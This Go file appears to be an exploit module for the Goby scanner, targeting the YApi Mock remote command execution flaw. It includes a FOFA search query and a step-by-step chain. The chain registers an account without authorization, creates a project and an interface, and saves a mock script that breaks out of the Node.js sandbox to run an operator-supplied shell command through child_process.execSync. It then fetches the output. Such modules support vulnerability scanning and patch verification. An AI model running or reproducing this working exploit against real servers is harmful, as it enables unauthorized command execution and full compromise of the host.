package exploits

import (
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "YApi Mock RCE",
    "Description": "<p>YApi is an efficient,easy-to-use,and powerful api management platform designed to provide developers,products,and testers with more elegant interface management services.</p><p>Yapi version 1.93 and less have unauthorized users to create users and can create arbitrary tasks in the background. Attackers can create malicious tasks for remote command execution.</p>",
    "Product": "YAPI",
    "Homepage": "https://github.com/YMFE/yapi",
    "DisclosureDate": "2021-07-06",
    "Author": "keeeee",
    "FofaQuery": "(body=\"content=\\\"YApi\" || body=\"<div id=\\\"yapi\\\" style=\\\"height: 100%;\")",
    "GobyQuery": "(body=\"content=\\\"YApi\" || body=\"<div id=\\\"yapi\\\" style=\\\"height: 100%;\")",
    "Level": "3",
    "Impact": "<p>YApi version 1.9.2 and less has a remote command execution vulnerability. Attackers can use this vulnerability to execute code on the server side, write it, obtain server permissions, and control the entire web server.</p>",
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Is0day": false,
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://github.com/YMFE/yapi/releases/tag/1.9.3\">https://github.com/YMFE/yapi/releases/tag/1.9.3</a></p>",
    "Translation": {
        "CN": {
            "Name": "YApi Mock 远程命令执行漏洞",
            "Product": "YAPI",
            "Description": "<p>YApi 是高效、易用、功能强大的 api 管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。</p><p>Yapi 1.93 以下版本存在未授权创建用户，并且可以在后台创建任意任务，攻击者可以通过创建恶意任务来进行远程命令执行。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/YMFE/yapi/releases/tag/1.9.3\">https://github.com/YMFE/yapi/releases/tag/1.9.3</a></p>",
            "Impact": "<p>YApi 1.9.3 以下版本存在远程命令执行漏洞，攻击者可通过该漏洞，在服务器端任意执⾏代码，写⼊后⻔，获取服务器权限，进⽽控制整个web服务器。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "YApi Mock RCE",
            "Product": "YAPI",
            "Description": "<p>YApi is an efficient,easy-to-use,and powerful api management platform designed to provide developers,products,and testers with more elegant interface management services.</p><p>Yapi version 1.93 and less have unauthorized users to create users and can create arbitrary tasks in the background. Attackers can create malicious tasks for remote command execution.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://github.com/YMFE/yapi/releases/tag/1.9.3\">https://github.com/YMFE/yapi/releases/tag/1.9.3</a></p>",
            "Impact": "<p>YApi version 1.9.2 and less has a remote command execution vulnerability. Attackers can use this vulnerability to execute code on the server side, write it, obtain server permissions, and control the entire web server.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "References": [
        "https://github.com/YMFE/yapi/issues/2099",
        "https://github.com/YMFE/yapi/issues/2233",
        "https://mp.weixin.qq.com/s/FAMfCxvdvW-VK99k_7NYxA"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami"
        }
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": true,
                "method": "GET",
                "uri": "/",
                "header": {}
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2024-04-17",
    "PocId": "10685"
}`

	// 正则匹配(输入：表达式 , 内容)
	makeRegularYapi := func(RegularContent string, RegularUrl string) (string, error) {
		reRequestasfDD := regexp.MustCompile(RegularUrl)
		if !reRequestasfDD.MatchString(RegularContent) {
			return "", fmt.Errorf("can't match value")
		}
		getname := reRequestasfDD.FindStringSubmatch(RegularContent)
		return getname[1], nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/api/user/reg"
			user := "kAsdwefVVwda@gmail.com"
			pass := "eKGbseUHsadd"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.Header.Store("Content-Type", "application/json")
			cfg1.Data = fmt.Sprintf("{\"email\":\"%s\",\"password\":\"%s\",\"username\":\"%s\"}", user, pass, user)
			resp, err := httpclient.DoHttpRequest(u, cfg1)
			if resp == nil || resp.StatusCode != 200 || err != nil {
				return false
			}

			uri2 := "/api/user/login"
			cfg2 := httpclient.NewPostRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.Header.Store("Content-Type", "application/json")
			cfg2.Data = fmt.Sprintf("{\"email\":\"%s\",\"password\":\"%s\"}", user, pass)
			resp2, err2 := httpclient.DoHttpRequest(u, cfg2)
			if resp2 == nil || err2 != nil || resp2.StatusCode != 200 || !strings.Contains(resp2.Utf8Html, user) {
				return false
			}

			YApiToken, _ := makeRegularYapi(resp2.HeaderString.String(), "Set-Cookie: _yapi_token=(.*?);")
			YApiUid, _ := makeRegularYapi(resp2.HeaderString.String(), "Set-Cookie: _yapi_uid=(.*?);")
			YApiCooike := "_yapi_token=" + YApiToken + ";_yapi_uid=" + YApiUid
			uri3 := "/api/group/list"
			cfg3 := httpclient.NewGetRequestConfig(uri3)
			cfg3.VerifyTls = false
			cfg3.Header.Store("Cookie", YApiCooike)
			resp3, err3 := httpclient.DoHttpRequest(u, cfg3)
			if resp3 == nil || err3 != nil || resp3.StatusCode != 200 {
				return false
			}

			YApiGroupId, _ := makeRegularYapi(resp3.Utf8Html, "\"_id\":(.*?),")
			uri4 := "/api/project/add"
			cfg4 := httpclient.NewPostRequestConfig(uri4)
			cfg4.VerifyTls = false
			cfg4.Header.Store("Content-Type", "application/json")
			cfg4.Header.Store("Cookie", YApiCooike)
			cfg4.Data = fmt.Sprintf("{\"name\":\"%s\",\"basepath\":\"/%s\",\"group_id\":\"%s\",\"icon\":\"code-o\",\"color\":\"red\",\"project_type\":\"private\"}", pass, pass, YApiGroupId)
			resp4, err4 := httpclient.DoHttpRequest(u, cfg4)
			if resp4 == nil || err4 != nil || resp4.StatusCode != 200 {
				return false
			}

			YApiId, _ := makeRegularYapi(resp4.Utf8Html, "\"tag\":\\[],\"_id\":(.*?),")
			uri5 := "/api/project/get?id=" + YApiId
			cfg5 := httpclient.NewGetRequestConfig(uri5)
			cfg5.VerifyTls = false
			cfg5.Header.Store("Cookie", YApiCooike)
			resp5, err5 := httpclient.DoHttpRequest(u, cfg5)
			if resp5 == nil || err5 != nil || resp5.StatusCode != 200 {
				return false
			}

			YApiCatId, _ := makeRegularYapi(resp5.Utf8Html, "\"cat\":\\[{\"index\":0,\"_id\":(.*?),")
			uri6 := "/api/interface/add"
			cfg6 := httpclient.NewPostRequestConfig(uri6)
			cfg6.VerifyTls = false
			cfg6.Header.Store("Content-Type", "application/json")
			cfg6.Header.Store("Cookie", YApiCooike)
			cfg6.Data = fmt.Sprintf("{\"method\":\"GET\",\"catid\":\"%s\",\"title\":\"%s\",\"path\":\"/%s\",\"project_id\":%s}", YApiCatId, pass, pass, YApiId)
			resp6, err6 := httpclient.DoHttpRequest(u, cfg6)
			if resp6 == nil || err6 != nil || resp6.StatusCode != 200 {
				return false
			}
			YApiInterfaceId, _ := makeRegularYapi(resp6.Utf8Html, "\"req_body_form\":\\[],\"_id\":(.*?),")
			uri7 := "/api/plugin/advmock/save"
			cfg7 := httpclient.NewPostRequestConfig(uri7)
			cfg7.VerifyTls = false
			cfg7.Header.Store("Content-Type", "application/json")
			cfg7.Header.Store("Cookie", YApiCooike)
			cfg7.Data = fmt.Sprintf("{\"project_id\":\"%s\",\"interface_id\":\"%s\",\"mock_script\":\"const sandbox = this\\r\\nconst ObjectConstructor = this.constructor\\r\\nconst FunctionConstructor = ObjectConstructor.constructor\\r\\nconst myfun = FunctionConstructor('return process')\\r\\nconst process = myfun()\\r\\nmockJson = process.mainModule.require(\\\"child_process\\\").execSync(\\\"%s\\\").toString()\",\"enable\":true}", YApiId, YApiInterfaceId, "echo test")
			resp7, err7 := httpclient.DoHttpRequest(u, cfg7)
			if resp7 == nil || err7 != nil || resp7.StatusCode != 200 {
				return false
			}

			uri8 := "/mock/" + YApiId + "/" + pass + "/" + pass
			resp8, err8 := httpclient.SimpleGet(u.FixedHostInfo + uri8)
			if resp8 == nil || err8 != nil || !strings.Contains(resp8.Utf8Html, "test") {
				return false
			}
			uri9 := "/api/project/del"
			cfg9 := httpclient.NewPostRequestConfig(uri9)
			cfg9.VerifyTls = false
			cfg9.Header.Store("Content-Type", "application/json")
			cfg9.Header.Store("Cookie", YApiCooike)
			cfg9.Data = fmt.Sprintf("{\"id\":%s}", YApiId)
			resp9, err9 := httpclient.DoHttpRequest(u, cfg9)
			if resp9 == nil || err9 != nil || resp9.StatusCode != 200 {
				return false
			}
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri1 := "/api/user/reg"
			user := "kAsdwefVVwda@gmail.com"
			pass := "eKGbseUHsadd"
			cmd := ss.Params["cmd"].(string)
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.Header.Store("Content-Type", "application/json")
			cfg1.Data = fmt.Sprintf("{\"email\":\"%s\",\"password\":\"%s\",\"username\":\"%s\"}", user, pass, user)
			resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1)
			if resp == nil || err != nil || resp.StatusCode != 200 {
				return expResult
			}

			uri2 := "/api/user/login"
			cfg2 := httpclient.NewPostRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.Header.Store("Content-Type", "application/json")
			cfg2.Data = fmt.Sprintf("{\"email\":\"%s\",\"password\":\"%s\"}", user, pass)
			resp2, err2 := httpclient.DoHttpRequest(expResult.HostInfo, cfg2)
			if resp2 == nil || err2 != nil || resp2.StatusCode != 200 || !strings.Contains(resp2.Utf8Html, user) {
				return expResult
			}

			YApiToken, _ := makeRegularYapi(resp2.HeaderString.String(), "Set-Cookie: _yapi_token=(.*?);")
			YApiUid, _ := makeRegularYapi(resp2.HeaderString.String(), "Set-Cookie: _yapi_uid=(.*?);")
			YApiCooike := "_yapi_token=" + YApiToken + ";_yapi_uid=" + YApiUid
			uri3 := "/api/group/list"
			cfg3 := httpclient.NewGetRequestConfig(uri3)
			cfg3.VerifyTls = false
			cfg3.Header.Store("Cookie", YApiCooike)
			resp3, err3 := httpclient.DoHttpRequest(expResult.HostInfo, cfg3)
			if resp3 == nil || err3 != nil || resp3.StatusCode != 200 {
				return expResult
			}

			YApiGroupId, _ := makeRegularYapi(resp3.Utf8Html, "\"_id\":(.*?),")
			uri4 := "/api/project/add"
			cfg4 := httpclient.NewPostRequestConfig(uri4)
			cfg4.VerifyTls = false
			cfg4.Header.Store("Content-Type", "application/json")
			cfg4.Header.Store("Cookie", YApiCooike)
			cfg4.Data = fmt.Sprintf("{\"name\":\"%s\",\"basepath\":\"/%s\",\"group_id\":\"%s\",\"icon\":\"code-o\",\"color\":\"red\",\"project_type\":\"private\"}", pass, pass, YApiGroupId)
			resp4, err4 := httpclient.DoHttpRequest(expResult.HostInfo, cfg4)
			if resp4 == nil || err4 != nil || resp4.StatusCode != 200 {
				return expResult
			}

			YApiId, _ := makeRegularYapi(resp4.Utf8Html, "\"tag\":\\[],\"_id\":(.*?),")
			uri5 := "/api/project/get?id=" + YApiId
			cfg5 := httpclient.NewGetRequestConfig(uri5)
			cfg5.VerifyTls = false
			cfg5.Header.Store("Cookie", YApiCooike)
			resp5, err5 := httpclient.DoHttpRequest(expResult.HostInfo, cfg5)
			if resp5 == nil || err5 != nil || resp5.StatusCode != 200 {
				return expResult
			}

			YApiCatId, _ := makeRegularYapi(resp5.Utf8Html, "\"cat\":\\[{\"index\":0,\"_id\":(.*?),")
			uri6 := "/api/interface/add"
			cfg6 := httpclient.NewPostRequestConfig(uri6)
			cfg6.VerifyTls = false
			cfg6.Header.Store("Content-Type", "application/json")
			cfg6.Header.Store("Cookie", YApiCooike)
			cfg6.Data = fmt.Sprintf("{\"method\":\"GET\",\"catid\":\"%s\",\"title\":\"%s\",\"path\":\"/%s\",\"project_id\":%s}", YApiCatId, pass, pass, YApiId)
			resp6, err6 := httpclient.DoHttpRequest(expResult.HostInfo, cfg6)
			if resp6 == nil || err6 != nil || resp6.StatusCode != 200 {
				return expResult
			}
			YApiInterfaceId, _ := makeRegularYapi(resp6.Utf8Html, "\"req_body_form\":\\[],\"_id\":(.*?),")
			uri7 := "/api/plugin/advmock/save"
			cfg7 := httpclient.NewPostRequestConfig(uri7)
			cfg7.VerifyTls = false
			cfg7.Header.Store("Content-Type", "application/json")
			cfg7.Header.Store("Cookie", YApiCooike)
			cfg7.Data = fmt.Sprintf("{\"project_id\":\"%s\",\"interface_id\":\"%s\",\"mock_script\":\"const sandbox = this\\r\\nconst ObjectConstructor = this.constructor\\r\\nconst FunctionConstructor = ObjectConstructor.constructor\\r\\nconst myfun = FunctionConstructor('return process')\\r\\nconst process = myfun()\\r\\nmockJson = process.mainModule.require(\\\"child_process\\\").execSync(\\\"%s\\\").toString()\",\"enable\":true}", YApiId, YApiInterfaceId, cmd)
			resp7, err7 := httpclient.DoHttpRequest(expResult.HostInfo, cfg7)
			if resp7 == nil || err7 != nil || resp7.StatusCode != 200 {
				return expResult
			}

			uri8 := "/mock/" + YApiId + "/" + pass + "/" + pass
			resp8, err8 := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + uri8)
			if resp8 == nil || err8 != nil {
				return expResult
			}
			expResult.Output = resp8.Utf8Html
			uri9 := "/api/project/del"
			cfg9 := httpclient.NewPostRequestConfig(uri9)
			cfg9.VerifyTls = false
			cfg9.Header.Store("Content-Type", "application/json")
			cfg9.Header.Store("Cookie", YApiCooike)
			cfg9.Data = fmt.Sprintf("{\"id\":%s}", YApiId)
			resp9, err9 := httpclient.DoHttpRequest(expResult.HostInfo, cfg9)
			if resp9 == nil || err9 != nil || resp9.StatusCode != 200 {
				return expResult
			}
			expResult.Success = true
			return expResult
		},
	))
}
